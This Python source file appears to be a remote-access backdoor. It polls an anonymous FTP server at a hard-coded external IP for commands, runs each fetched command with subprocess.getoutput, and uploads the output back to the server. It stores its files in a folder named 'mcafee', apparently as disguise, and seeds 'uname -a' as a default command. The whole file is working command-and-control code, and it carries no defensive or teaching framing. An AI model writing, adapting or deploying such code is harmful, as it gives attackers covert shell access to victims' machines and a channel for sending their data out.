from ftplib import FTP
import io
import subprocess

proxy_ip = '115.248.50.90'
proxy_port = 5999
proxy_user = 'anonymous'
proxy_pass = 'anonymous'

delimiter = '\n-#$#-\n'

parent_dir = "mcafee"



class cmdFile:
    def __init__(self, session):
        self.session = session
        self.oo = b''
        self.ss = ''
        self.connectFtp()
        self.session_file = open(self.session + 'cm', 'w+')     # Save the command in local log file
        self.session_file.close()
        
        try:
            self.ftp.mkd(parent_dir)
        except:
            print("some error 0x1")

        try:
            self.ftp.cwd(parent_dir)
        except:
            print("Some error 0x3")
        return 
    
    def connectFtp(self):
        try:
            self.ftp = FTP()
            self.ftp.connect(proxy_ip, proxy_port)
            self.ftp.login(proxy_user, proxy_pass)
        except:
            self.connectFtp()
        return 

    def putCommand(self, cmd):
        self.session_file = open(self.session + '.cm', 'ab')     # Save the command in local log file
        #s = self.session_file.read()
        self.session_file.write(bytes(delimiter + cmd, 'ascii'))
        self.session_file.close()

        try:
            self.getCommandFile()
            if len(self.ss) > 0:
                print("\nWait, last command did not finished")
                return
            
            bio = io.BytesIO(bytes(cmd, 'ascii'))
            self.ftp.storbinary('STOR ' + self.session + '.cm', bio)
            print("\nCommand Delivered!")
        except:
            print("some error 0x2")

        return 

    def executeCommand(self):
        self.getCommandFile()
        #need to clear the file now
        try:
            bio = io.BytesIO(b'')
            self.ftp.storbinary('STOR ' + self.session + '.cm', bio)

            oop = subprocess.getoutput(self.ss)
            print(oop)
            self.ss = ''
            #self.getOutputFile()
            self.oo += bytes(delimiter + oop, 'ascii')
            print(oop)

        except: 
            self.oo += delimiter + oop

        try:
            bio = io.BytesIO(self.oo)   # Save this output into a complete outputs file
            self.ftp.storbinary('STOR ' + self.session + '.op', bio)

            bio = io.BytesIO(bytes(oop, 'ascii'))   # Save this output into a file
            self.ftp.storbinary('STOR ' + self.session + '.oo', bio)

        except:
            print("some error 0x5")

        return 

    def getCommandFile(self):
        self.ss = ''
        try:
            self.tmpfile = open('tmp'+self.session+'.cm', 'wb')
            self.ftp.retrbinary("RETR " + self.session + '.cm', self.tmpfile.write)
            self.tmpfile.close()
            self.tmpfile = open('tmp'+self.session+'.cm', 'rb')
            self.ss = self.tmpfile.read()
            self.tmpfile.close()
        except:
            bio = io.BytesIO(b'uname -a')
            self.ftp.storbinary('STOR ' + self.session + '.cm', bio)
        return self.ss

    def getLastOutput(self):
        return 

    def getOutputFile(self):
        self.oo = b''
        try:
            self.tmpfile = open('tmp'+self.session+'.op', 'wb')
            self.ftp.retrbinary("RETR " + self.session + '.op', self.tmpfile.write)
            self.tmpfile.close()
            self.tmpfile = open('tmp'+self.session+'.op', 'rb')
            self.oo = self.tmpfile.read()
            self.tmpfile.close()
        except:
            bio = io.BytesIO(b'')
            self.ftp.storbinary('STOR ' + self.session + '.op', bio)
        return self.oo